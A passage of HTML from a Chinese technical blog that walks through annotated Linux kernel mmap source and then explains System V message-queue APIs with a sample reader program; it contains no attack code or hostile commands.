*/</span></span><br><span class="line">		<span class="keyword">if</span> (TASK_SIZE - len &gt;= addr &amp;&amp;</span><br><span class="line">		    (!vma || addr + len &lt;= vm_start_gap(vma)))</span><br><span class="line">			<span class="keyword">return</span> addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	info.length = len; </span><br><span class="line">	info.align_mask = do_color_align ? (PAGE_MASK &amp; shm_align_mask) : <span class="number">0</span>;</span><br><span class="line">	info.align_offset = pgoff &lt;&lt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dir == DOWN) &#123; <span class="comment">/* 自上而下进行映射(在本调用链中恒不成立) */</span></span><br><span class="line">		info.flags = VM_UNMAPPED_AREA_TOPDOWN;</span><br><span class="line">		info.low_limit = PAGE_SIZE;</span><br><span class="line">		info.high_limit = mm-&gt;mmap_base;</span><br><span class="line">		addr = vm_unmapped_area(&amp;info); <span class="comment">/* 根据vm_unmapped_area_info扫描mmap映射区域来查找满足请求的内存 */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!(addr &amp; ~PAGE_MASK)) <span class="comment">/* &quot;addr&amp;~PAGE_MASK&quot;可判定addr是否是4096倍数,如果结果为&quot;0&quot;,则是,否则不是 */</span></span><br><span class="line">			<span class="keyword">return</span> addr; <span class="comment">/* addr是否是4096倍数则返回 */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * A failed mmap() very likely causes application failure,</span></span><br><span class="line"><span class="comment">		 * so fall back to the bottom-up function here. This scenario</span></span><br><span class="line"><span class="comment">		 * can happen with large stack limits and large mmap()</span></span><br><span class="line"><span class="comment">		 * allocations.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	info.flags = <span class="number">0</span>;</span><br><span class="line">	info.low_limit = mm-&gt;mmap_base;</span><br><span class="line">	info.high_limit = TASK_SIZE;</span><br><span class="line">	<span class="keyword">return</span> vm_unmapped_area(&amp;info); <span class="comment">/* 根据vm_unmapped_area_info扫描mmap映射区域来查找满足请求的内存 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>vm_unmapped_area</code> 用于在 mmap 映射区域中查找满足请求的内存（以 <code>vm_area_struct</code> 为单位），这是内存分配中最底层的内容</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 搜索未映射的地址范围,条件如下:</span></span><br><span class="line"><span class="comment"> * - 不与任何VMA相交</span></span><br><span class="line"><span class="comment"> * - 区间范围属于 [low_limit,high_limit)</span></span><br><span class="line"><span class="comment"> * - 地址大小至少是 length</span></span><br><span class="line"><span class="comment"> * - 满足 (begin_addr &amp; align_mask) == (align_offset &amp; align_mask)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">vm_unmapped_area</span><span class="params">(struct vm_unmapped_area_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (info-&gt;flags &amp; VM_UNMAPPED_AREA_TOPDOWN) <span class="comment">/* VM_UNMAPPED_AREA_TOPDOWN:将虚拟机未映射区域自上而下进行映射(在本调用链中恒不成立) */</span></span><br><span class="line">		<span class="keyword">return</span> unmapped_area_topdown(info); <span class="comment">/* 反向 */</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> unmapped_area(info); <span class="comment">/* 正向 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>看来 mmap 还支持反向映射，我们这里主要研究正向映射 <code>unmapped_area</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">unmapped_area</span><span class="params">(struct vm_unmapped_area_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 我们通过寻找紧跟合适间隙的rbtree节点来实现搜索</span></span><br><span class="line"><span class="comment">	 * - gap_start = vma-&gt;vm_prev-&gt;vm_end &lt;= info-&gt;high_limit - length;</span></span><br><span class="line"><span class="comment">	 * - gap_end   = vma-&gt;vm_start        &gt;= info-&gt;low_limit  + length;</span></span><br><span class="line"><span class="comment">	 * - gap_end - gap_start &gt;= length</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> length, low_limit, high_limit, gap_start, gap_end;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust search length to account for worst case alignment overhead */</span></span><br><span class="line">	length = info-&gt;length + info-&gt;align_mask;</span><br><span class="line">	<span class="keyword">if</span> (length &lt; info-&gt;length)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust search limits by the desired length */</span></span><br><span class="line">	<span class="keyword">if</span> (info-&gt;high_limit &lt; length)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	high_limit = info-&gt;high_limit - length;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (info-&gt;low_limit &gt; high_limit)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	low_limit = info-&gt;low_limit + length;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check if rbtree root looks promising */</span></span><br><span class="line">	<span class="keyword">if</span> (RB_EMPTY_ROOT(&amp;mm-&gt;mm_rb))</span><br><span class="line">		<span class="keyword">goto</span> check_highest;</span><br><span class="line">	vma = rb_entry(mm-&gt;mm_rb.rb_node, struct vm_area_struct, vm_rb);</span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;rb_subtree_gap &lt; length)</span><br><span class="line">		<span class="keyword">goto</span> check_highest;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="comment">/* Visit left subtree if it looks promising */</span></span><br><span class="line">		gap_end = vm_start_gap(vma);</span><br><span class="line">		<span class="keyword">if</span> (gap_end &gt;= low_limit &amp;&amp; vma-&gt;vm_rb.rb_left) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">left</span> =</span></span><br><span class="line">				rb_entry(vma-&gt;vm_rb.rb_left,</span><br><span class="line">					 struct vm_area_struct, vm_rb);</span><br><span class="line">			<span class="keyword">if</span> (left-&gt;rb_subtree_gap &gt;= length) &#123;</span><br><span class="line">				vma = left;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		gap_start = vma-&gt;vm_prev ? vm_end_gap(vma-&gt;vm_prev) : <span class="number">0</span>;</span><br><span class="line">check_current:</span><br><span class="line">		<span class="comment">/* Check if current node has a suitable gap */</span></span><br><span class="line">		<span class="keyword">if</span> (gap_start &gt; high_limit)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (gap_end &gt;= low_limit &amp;&amp;</span><br><span class="line">		    gap_end &gt; gap_start &amp;&amp; gap_end - gap_start &gt;= length)</span><br><span class="line">			<span class="keyword">goto</span> found;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Visit right subtree if it looks promising */</span></span><br><span class="line">		<span class="keyword">if</span> (vma-&gt;vm_rb.rb_right) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">right</span> =</span></span><br><span class="line">				rb_entry(vma-&gt;vm_rb.rb_right,</span><br><span class="line">					 struct vm_area_struct, vm_rb);</span><br><span class="line">			<span class="keyword">if</span> (right-&gt;rb_subtree_gap &gt;= length) &#123;</span><br><span class="line">				vma = right;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Go back up the rbtree to find next candidate node */</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">prev</span> =</span> &amp;vma-&gt;vm_rb;</span><br><span class="line">			<span class="keyword">if</span> (!rb_parent(prev))</span><br><span class="line">				<span class="keyword">goto</span> check_highest;</span><br><span class="line">			vma = rb_entry(rb_parent(prev),</span><br><span class="line">				       struct vm_area_struct, vm_rb);</span><br><span class="line">			<span class="keyword">if</span> (prev == vma-&gt;vm_rb.rb_left) &#123;</span><br><span class="line">				gap_start = vm_end_gap(vma-&gt;vm_prev);</span><br><span class="line">				gap_end = vm_start_gap(vma);</span><br><span class="line">				<span class="keyword">goto</span> check_current;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">check_highest:</span><br><span class="line">	<span class="comment">/* Check highest gap, which does not precede any rbtree node */</span></span><br><span class="line">	gap_start = mm-&gt;highest_vm_end;</span><br><span class="line">	gap_end = ULONG_MAX;  <span class="comment">/* Only for VM_BUG_ON below */</span></span><br><span class="line">	<span class="keyword">if</span> (gap_start &gt; high_limit)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">	<span class="comment">/* We found a suitable gap. Clip it with the original low_limit. */</span></span><br><span class="line">	<span class="keyword">if</span> (gap_start &lt; info-&gt;low_limit)</span><br><span class="line">		gap_start = info-&gt;low_limit;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust gap address to the desired alignment */</span></span><br><span class="line">	gap_start += (info-&gt;align_offset - gap_start) &amp; info-&gt;align_mask;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(gap_start + info-&gt;length &gt; info-&gt;high_limit);</span><br><span class="line">	VM_BUG_ON(gap_start + info-&gt;length &gt; gap_end);</span><br><span class="line">	<span class="keyword">return</span> gap_start; <span class="comment">/* 最后返回找到的addr */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>最底层的查找过程是用 <strong>红黑树</strong> 实现的（由于本人对红黑树还不是很了解，这里就先跳过了）</li>
<li>至于 mmap 映射区域的由来，这就是分页机制和内容了</li>
<li>最后返回到之前的函数中，mmap 也设置了两种机制：共享和私有<ul>
<li>如果是共享映射，那么在内存中对文件进行修改，磁盘中对应的文件也会被修改，相反，磁盘中的文件有了修改，内存中的文件也被修改</li>
<li>如果是私有映射，那么内存中的文件是独立的，二者进行修改都不会对对方造成影响</li>
</ul>
</li>
<li>不管是调用 <code>do_mmap_shared_file</code> 或者 <code>do_mmap_private</code>，他们底层都会调用 <code>call_mmap</code> 完成最后的设置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">call_mmap</span><span class="params">(struct file *file, struct vm_area_struct *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> file-&gt;f_op-&gt;mmap(file, vma);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Ext4 文件系统中 <code>file-&gt;f_op-&gt;mmap</code> 指向 <code>ext4_file_mmap</code>（Linux 默认的文件系统为 Ext2 Ext3 Ext4）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_file_mmap</span><span class="params">(struct file *file, struct vm_area_struct *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file-&gt;f_mapping-&gt;host;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))</span><br><span class="line">		<span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We don&#x27;t support synchronous mappings for non-DAX files. At least</span></span><br><span class="line"><span class="comment">	 * until someone comes with a sensible use case.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!IS_DAX(file_inode(file)) &amp;&amp; (vma-&gt;vm_flags &amp; VM_SYNC))</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">	file_accessed(file);</span><br><span class="line">	<span class="keyword">if</span> (IS_DAX(file_inode(file))) &#123;</span><br><span class="line">		vma-&gt;vm_ops = &amp;ext4_dax_vm_ops; <span class="comment">/* 初始化vma-&gt;vm_ops(在page fault handler中被使用到) */</span></span><br><span class="line">		vma-&gt;vm_flags |= VM_HUGEPAGE;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		vma-&gt;vm_ops = &amp;ext4_file_vm_ops;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当所有的剩余工作都处理完成后，mmap 就会返回在 mmap 映射区找到的 addr</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：msg底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-19 20:58:41 / Modified: 21:00:34" itemprop="dateCreated datePublished" datetime="2022-09-19T20:58:41+08:00">2022-09-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>msg 简述</strong></p>
<p>消息队列，是消息的链接表，存放在内核中，一个消息队列由一个标识符（即ID）来标识</p>
<ul>
<li>消息队列的标识符 key 键，它的基本类型是 key_t，使用 <code>ftok</code> 函数可以生成一个 key_t</li>
<li>两个无关的进程，可以通过唯一标识符 key 来找到对应的 msg</li>
</ul>
<img src="/2022/09/19/Principles%EF%BC%9Amsg%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663569472621.png" class width="1663569472621"> 
<p>共享内存，消息队列，信号量它们三个都是找一个中间介质来进行通信的，就是文件的设备编号和节点，<code>ftok()</code> 就可以通过“文件路径”来获取一个 key_t 键值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 系统IPC键值的格式转换函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">key_t</span> <span class="title">ftok</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * fname, <span class="keyword">int</span> id)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>fname：<ul>
<li>指定的文件名，这个文件必须是存在的而且可以访问的</li>
<li>只是根据文件 inode 在系统内的唯一性来取一个数值，和文件的权限无关 </li>
</ul>
</li>
<li>id：<ul>
<li>子序号，它是一个8bit的整数，即范围是0~255 </li>
<li>可以根据自己的约定，随意设置</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回 key_t 键值 </li>
<li>出错：返回 “-1”</li>
</ul>
</li>
</ul>
<p><strong>msg API</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 创建或打开消息队列:成功返回队列ID,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span>; </span><br></pre></td></tr></table></figure>
<ul>
<li>key：<ul>
<li>IPC_PRIVATE - “0”：会建立新的消息队列（只能单进程通信，不能在两个进程之间进行通信）</li>
<li>大于0的32位整数：视参数 msgflg 来确定操作，通常要求此值来源于 ftok 返回的 IPC 键值</li>
</ul>
</li>
<li>msgflg：<ul>
<li>“0”：取消息队列标识符，若不存在则函数会报错</li>
<li>IPC_CREAT：如果内核中不存在键值与 key 相等的消息队列，则新建一个消息队列，如果存在这样的消息队列，返回此消息队列的标识符 </li>
<li>IPC_CREAT | IPC_EXCL：如果内核中不存在键值与 key 相等的消息队列，则新建一个消息队列，如果存在这样的消息队列则报错 </li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回消息队列的标识符 </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 添加消息:成功返回0,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：<ul>
<li>消息队列标识符 </li>
</ul>
</li>
<li>msgp：<ul>
<li>发送给队列的消息</li>
<li>msgp 可以是任何类型的结构体，但第一个字段必须为 long 类型，即表明此发送消息的类型</li>
</ul>
</li>
<li>msgsz：<ul>
<li>要发送消息的大小（不含消息类型占用的4个字节）</li>
</ul>
</li>
<li>msgflg：<ul>
<li>“0”：当消息队列满时，msgsnd 将会阻塞，直到消息能写进消息队列</li>
<li>IPC_NOWAIT：当消息队列已满的时候，msgsnd 函数不等待立即返回</li>
<li>MSG_NOERROR：若发送的消息大于 size 字节，则把该消息截断，截断部分将被丢弃，且不通知发送进程</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回 “0” </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 读取消息:成功返回消息数据的长度,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：<ul>
<li>消息队列标识符 </li>
</ul>
</li>
<li>msgp：<ul>
<li>存放消息的结构体</li>
<li>结构体类型要与 msgsnd 函数发送的类型相同</li>
</ul>
</li>
<li>msgsz：<ul>
<li>要接收消息的大小（不含消息类型占用的4个字节）</li>
</ul>
</li>
<li>msgtyp：<ul>
<li>“0”：接收第一个消息 </li>
<li>大于零：接收类型等于 msgtyp 的第一个消息 </li>
<li>小于零：接收类型等于或者小于 msgtyp 绝对值的第一个消息 </li>
</ul>
</li>
<li>msgflg：<ul>
<li>“0”：阻塞式接收消息，没有该类型的消息 msgrcv 函数一直阻塞等待</li>
<li>IPC_NOWAIT：如果没有符合条件的 msg 则立即返回“-1”，此时错误码为 ENOMSG </li>
<li>MSG_COPY：内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
<li>MSG_EXCEPT：返回队列中第一个类型不为 msgtype 的消息 </li>
<li>MSG_NOERROR：如果队列中满足条件的消息内容大于所请求的 size 字节，则把该消息截断，截断部分将被丢弃</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回 “0” </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 控制消息队列:成功返回0,失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：<ul>
<li>消息队列标识符 </li>
</ul>
</li>
<li>cmd：<ul>
<li>IPC_STAT：获得 msgid 的消息队列头数据到 buf 中</li>
<li>IPC_SET：设置消息队列的属性，要设置的属性需先存储在 buf 中，可设置的属性包括：<ul>
<li>msg_perm.uid、msg_perm.gid、msg_perm.mode 以及 msg_qbytes </li>
</ul>
</li>
</ul>
</li>
<li>return：<ul>
<li>成功：“0” </li>
<li>出错：“-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<p><strong>msg 使用案例</strong></p>
<p>read.c 文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;       <span class="comment">/* message type, must be &gt; 0 */</span></span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">128</span>];    <span class="comment">/* message data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">sendbuf</span>=</span>&#123;<span class="number">999</span>,<span class="string">&quot;888 message already received&quot;</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">readbuf</span>;</span></span><br><span class="line">        <span class="keyword">int</span> msgid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">key_t</span> key;</span><br><span class="line">        key = ftok(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;z&#x27;</span>);<span class="comment">//获取键值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key=%x\n&quot;</span>,key);</span><br><span class="line">        msgid=msgget(key,IPC_CREAT|<span class="number">0777</span>);<span class="comment">//在内核中打开或建立键值为key的，权限为0777的消息队列</span></span><br><span class="line">        <span class="keyword">if</span>(msgid == <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;create msgq failure\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        msgrcv(msgid,&amp;readbuf,<span class="keyword">sizeof</span>(readbuf.mtext),<span class="number">888</span>,<span class="number">0</span>);<span class="comment">//从队列中获取888类型的数据，如果队列中未出现888类型的数据，则程序阻塞在这里</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;read from que:%s\n&quot;</span>,readbuf.mtext);</span><br><span class="line">        msgsnd(msgid,&amp;sendbuf,<span class="built_in">strlen</span>(sendbuf.mtext),<span class="number">0</span>);<span class="comment">//往队列id为msgid的队列写入sendbuf(类型为999)数据</span></span><br><span class="line">        msgctl(msgid,IPC_RMID,<span class="literal">NULL</span>);<span class="comment">//将队列从系统内核中删除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>send.c 文件：</p>
